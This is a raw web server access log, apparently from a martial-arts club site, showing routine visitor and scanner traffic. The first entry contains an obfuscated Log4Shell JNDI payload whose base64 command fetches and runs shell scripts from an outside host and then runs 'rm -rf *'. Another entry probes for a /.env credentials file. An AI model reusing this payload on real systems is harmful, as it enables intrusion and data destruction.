::ffff:167.99.144.251 - - [19/Nov/2022:00:01:03 +0000] "GET /:80:undefined?id= HTTP/1.1" 404 152 "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//137.184.207.85:1389/WebsphereBypass/Upload/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGN1cmwgLU8gaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGNobW9kIDc3NyBodWguc2g7IHNoIGh1aC5zaDsgdGZ0cCAxOTEuMjM0LjIwMC4yMTYgLWMgZ2V0IGh1aC5zaDsgY2htb2QgNzc3IGh1aC5zaDsgc2ggaHVoLnNoOyB0ZnRwIC1yIGh1aDIuc2ggLWcgMTkxLjIzNC4yMDAuMjE2OyBjaG1vZCA3NzcgaHVoMi5zaDsgc2ggaHVoMi5zaDsgZnRwZ2V0IC12IC11IGFub255bW91cyAtcCBhbm9ueW1vdXMgLVAgMjEgMTkxLjIzNC4yMDAuMjE2IGh1aDEuc2ggaHVoMS5zaDsgc2ggaHVoMS5zaDsgcm0gLXJmIGh1aC5zaCBodWguc2ggaHVoMi5zaCBodWgxLnNoOyBybSAtcmYgKg==}')" "t('${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//137.184.207.85:1389/WebsphereBypass/Upload/Command/Base64/Y2QgL3RtcCB8fCBjZCAvdmFyL3J1biB8fCBjZCAvbW50IHx8IGNkIC9yb290IHx8IGNkIC87IHdnZXQgaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGN1cmwgLU8gaHR0cDovLzE5MS4yMzQuMjAwLjIxNi9odWguc2g7IGNobW9kIDc3NyBodWguc2g7IHNoIGh1aC5zaDsgdGZ0cCAxOTEuMjM0LjIwMC4yMTYgLWMgZ2V0IGh1aC5zaDsgY2htb2QgNzc3IGh1aC5zaDsgc2ggaHVoLnNoOyB0ZnRwIC1yIGh1aDIuc2ggLWcgMTkxLjIzNC4yMDAuMjE2OyBjaG1vZCA3NzcgaHVoMi5zaDsgc2ggaHVoMi5zaDsgZnRwZ2V0IC12IC11IGFub255bW91cyAtcCBhbm9ueW1vdXMgLVAgMjEgMTkxLjIzNC4yMDAuMjE2IGh1aDEuc2ggaHVoMS5zaDsgc2ggaHVoMS5zaDsgcm0gLXJmIGh1aC5zaCBodWguc2ggaHVoMi5zaCBodWgxLnNoOyBybSAtcmYgKg==}')"
::ffff:198.235.24.129 - - [19/Nov/2022:00:01:43 +0000] "GET / HTTP/1.0" 200 58140 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:203.10.99.204 - - [19/Nov/2022:00:04:49 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:51.159.164.227 - - [19/Nov/2022:00:06:33 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:51.159.164.227 - - [19/Nov/2022:00:06:34 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
::ffff:135.125.244.48 - - [19/Nov/2022:00:10:52 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [19/Nov/2022:00:10:52 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:203.10.99.204 - - [19/Nov/2022:00:20:01 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [19/Nov/2022:00:21:29 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:203.10.99.204 - - [19/Nov/2022:00:29:49 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:94.102.61.10 - - [19/Nov/2022:00:31:59 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "python-requests/2.26.0"
